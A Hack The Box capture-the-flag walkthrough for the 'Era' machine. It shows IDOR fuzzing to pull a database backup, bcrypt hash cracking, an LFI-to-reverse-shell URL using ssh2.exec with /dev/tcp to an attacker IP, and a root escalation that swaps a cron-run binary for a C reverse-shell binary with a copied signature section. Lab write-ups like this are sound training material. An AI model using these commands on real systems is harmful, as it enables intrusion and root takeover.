
# 👨‍💻Era HTB Walkthrough

* **Machine Type**: Linux  
* **Solved by**: Akshat Nigam  
* **Category**: Web Exploitation, LFI, Privilege Escalation  
* **Difficulty**: Medium  
* **Attack Surface**: Web Application, Backup Disclosure, FTP Access, Cron Exploitation, IDOR   

---

## Port Scan

```bash
nmap -sC -sV 10.10.11.79 -v
````

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Era Designs
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

---

## Subdomain Discovery

```bash
ffuf -u 'http://era.htb' -H 'Host: FUZZ.era.htb' -w /usr/share/fuzzDicts/subdomainDicts/main.txt -fw
```

* Found: `file.era.htb`
* Added to `/etc/hosts`:

```
10.10.11.79 era.htb file.era.htb
```

---

## Directory Enumeration

Visited `http://file.era.htb` → Requires login to manage/upload files.

```bash
dirsearch -u file.era.htb
```

Found a register.php page

---

## ID Fuzzing → Backup Discovery

1. Uploaded a test file to get a download route:

   ```
   /download.php?id=<number>
   ```
2. Created ID list:

   ```bash
   seq 1 5000 > id.txt
   ```
3. Fuzzed:

   ```bash
   ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w id.txt -H 'Cookie: PHPSESSID=kgp1ni9n5t7j1qci64bhjg23po' -fw 3161
   ```
4. Found ID `54` → Backup archive containing `filedb.sqlite`.

---

## Credential Extraction

```bash
sqlite3 filedb.sqlite
.dump
```

* Extracted password hashes from `users` table.
* Cracked with:

```bash
john hash.txt -w=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

---

## LFI via `php://filter`

From `download.php` source:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
```

Admin can perform arbitrary file read using:

```bash
php://filter/convert.base64-encode/resource=/etc/passwd
```

---

## Admin Login & Reverse Shell

Used discovered credentials to log in as admin.

Triggered reverse shell via:

```bash
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'; #
```

On attacker machine:

```bash
rlwrap nc -nlvp 4444
```

---

## Privilege Escalation

### Cron Job Abuse

Uploaded `linpeas.sh` → Found `/root/initiate_monitoring.sh` executed frequently by CRON.

Observed binary `/opt/AV/periodic-checks/monitor` with `.text_sig` section integrity checks.

---

### Exploit

Create backdoored binary:

```c
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'");
    return 0;
}
```

Compile:

```bash
gcc exploit.c -o attack
```

Replace `.text_sig`:

```bash
objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
objcopy --add-section .text_sig=text_sig attack
cp attack /opt/AV/periodic-checks/monitor
```

Wait for CRON or execute manually:

```bash
./monitor
```

Catch root shell:

```bash
nc -nlvp 4444
```

---

## Summary

* **User:** Found `file.era.htb`, enumerated IDs, retrieved backup, cracked hashes, logged in as admin, leveraged `php://filter` to read files and trigger reverse shell.
* **Root:** Abused cron job running privileged binary with modifiable `.text_sig` section to inject reverse shell payload.

> Rooted `Era` 🏴‍☠️


